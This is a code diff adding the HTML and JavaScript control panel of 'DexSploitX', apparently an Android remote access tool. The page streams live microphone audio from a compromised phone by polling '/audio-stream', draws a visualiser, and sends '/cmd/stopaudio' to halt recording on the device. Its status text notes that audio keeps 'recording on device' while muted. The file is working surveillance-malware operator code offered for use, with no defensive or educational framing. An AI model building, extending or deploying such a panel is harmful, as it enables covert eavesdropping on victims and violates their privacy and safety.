@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DexSploitX - Live Audio Stream</title>
+    <style>
+        body {
+            background: #0d0d0d;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        h1 {
+            text-align: center;
+            color: #00ff00;
+            text-shadow: 0 0 15px #00ff00;
+            margin-bottom: 10px;
+        }
+        #status {
+            margin: 10px 0;
+            padding: 12px;
+            background: #1a1a1a;
+            border: 2px solid #00ff00;
+            border-radius: 8px;
+            min-width: 400px;
+            text-align: center;
+            font-size: 18px;
+            box-shadow: 0 0 10px #00ff00;
+        }
+        #audioContainer {
+            position: relative;
+            border: 3px solid #00ff00;
+            padding: 40px;
+            background: #000;
+            box-shadow: 0 0 30px #00ff00;
+            border-radius: 10px;
+            margin: 20px 0;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        #audioVisualizer {
+            width: 100%;
+            height: 200px;
+            background: #000;
+            border: 2px solid #00ff00;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .audioIcon {
+            font-size: 80px;
+            margin: 20px 0;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.7; transform: scale(1.1); }
+        }
+        .controls {
+            display: flex;
+            gap: 15px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        button {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 8px;
+            box-shadow: 0 0 15px #00ff00;
+            transition: all 0.3s;
+        }
+        button:hover {
+            background: #00cc00;
+            transform: scale(1.05);
+        }
+        #stopBtn {
+            background: #ff0000;
+            color: white;
+        }
+        #stopBtn:hover {
+            background: #cc0000;
+            box-shadow: 0 0 20px #ff0000;
+        }
+        #micBtn {
+            background: #00cc00;
+            color: white;
+        }
+        #micBtn.muted {
+            background: #ff6600;
+        }
+        footer {
+            margin-top: 30px;
+            font-size: 14px;
+            color: #006600;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎤 DexSploitX - Live Audio Stream</h1>
+    <div id="status">Status: Connecting...</div>
+
+    <div id="audioContainer">
+        <div class="audioIcon">🎤</div>
+        <canvas id="audioVisualizer"></canvas>
+        <div id="audioInfo">Listening...</div>
+    </div>
+
+    <div class="controls">
+        <button id="micBtn" onclick="toggleMic()">🎤 Mute Mic</button>
+        <button id="stopBtn" onclick="stopStream()">⏹ Stop Stream</button>
+    </div>
+
+    <footer>DexSploitX - Remote Android Access Tool</footer>
+
+    <script>
+        const statusDiv = document.getElementById('status');
+        const canvas = document.getElementById('audioVisualizer');
+        const ctx = canvas.getContext('2d');
+        
+        let audioContext = null;
+        let isMuted = false; // Start unmuted
+        let gainNode = null;
+        let analyser = null;
+        let dataArray = null;
+        let audioInitialized = false;
+
+        canvas.width = canvas.offsetWidth;
+        canvas.height = 200;
+
+        // Initialize Web Audio API
+        function initAudio() {
+            if (!audioContext) {
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                gainNode = audioContext.createGain();
+                analyser = audioContext.createAnalyser();
+                analyser.fftSize = 256;
+                
+                gainNode.connect(analyser);
+                analyser.connect(audioContext.destination);
+                
+                const bufferLength = analyser.frequencyBinCount;
+                dataArray = new Uint8Array(bufferLength);
+                
+                startAudioPlayback();
+                drawVisualizer();
+            }
+        }
+
+        function startAudioPlayback() {
+            setInterval(() => {
+                if (!isMuted) {
+                    fetch('/audio-stream')
+                        .then(response => response.arrayBuffer())
+                        .then(data => {
+                            if (data.byteLength > 0) {
+                                playAudio(data);
+                            }
+                        })
+                        .catch(() => {});
+                }
+            }, 100);
+        }
+
+        function playAudio(arrayBuffer) {
+            if (isMuted || !audioContext || !gainNode) return;
+
+            const pcmData = new Int16Array(arrayBuffer);
+            const floatData = new Float32Array(pcmData.length);
+            for (let i = 0; i < pcmData.length; i++) {
+                floatData[i] = pcmData[i] / 32768.0;
+            }
+
+            const audioBuffer = audioContext.createBuffer(1, floatData.length, 16000);
+            audioBuffer.getChannelData(0).set(floatData);
+
+            const source = audioContext.createBufferSource();
+            source.buffer = audioBuffer;
+            source.connect(gainNode);
+            source.start();
+        }
+
+        function drawVisualizer() {
+            requestAnimationFrame(drawVisualizer);
+
+            if (!analyser || isMuted) {
+                ctx.fillStyle = '#000';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                return;
+            }
+
+            analyser.getByteFrequencyData(dataArray);
+
+            ctx.fillStyle = '#000';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            const barWidth = (canvas.width / dataArray.length) * 2.5;
+            let barHeight;
+            let x = 0;
+
+            for (let i = 0; i < dataArray.length; i++) {
+                barHeight = (dataArray[i] / 255) * canvas.height;
+
+                const green = Math.floor((dataArray[i] / 255) * 255);
+                ctx.fillStyle = `rgb(0, ${green}, 0)`;
+                ctx.fillRect(x, canvas.height - barHeight, barWidth, barHeight);
+
+                x += barWidth + 1;
+            }
+        }
+
+        function toggleMic() {
+            isMuted = !isMuted;
+            const micBtn = document.getElementById('micBtn');
+            if (isMuted) {
+                micBtn.textContent = '🔇 Unmute Mic';
+                micBtn.classList.add('muted');
+                statusDiv.textContent = 'Status: Muted (Audio still recording on device)';
+            } else {
+                micBtn.textContent = '🎤 Mute Mic';
+                micBtn.classList.remove('muted');
+                statusDiv.textContent = 'Status: Listening...';
+                if (!audioContext) initAudio();
+            }
+        }
+
+        function stopStream() {
+            statusDiv.textContent = 'Stopping audio stream...';
+            fetch('/cmd/stopaudio').then(response => {
+                if (response.ok) {
+                    statusDiv.textContent = 'Stream Stopped - Audio recording stopped on device';
+                    isMuted = true;
+                    const micBtn = document.getElementById('micBtn');
+                    micBtn.textContent = '🔇 Unmute Mic';
+                    micBtn.classList.add('muted');
+                    // Stop audio context
+                    if (audioContext) {
+                        audioContext.close();
+                        audioContext = null;
+                        audioInitialized = false;
+                    }
+                }
+            }).catch(err => {
+                statusDiv.textContent = 'Error stopping stream: ' + err.message;
+            });
+        }
+
+        // Auto-initialize audio immediately
+        setTimeout(() => {
+            if (!audioInitialized) {
+                initAudio();
+                audioInitialized = true;
+                isMuted = false;
+                statusDiv.textContent = 'Status: Listening...';
+            }
+        }, 100);
+
+        // Fallback: Initialize on any user interaction
+        document.addEventListener('click', () => {
+            if (!audioInitialized) {
+                initAudio();
+                audioInitialized = true;
+                isMuted = false;
+                statusDiv.textContent = 'Status: Listening...';
+            }
+        }, { once: true });
+
+        statusDiv.textContent = 'Status: Connecting...';
+    </script>
+</body>
+</html>
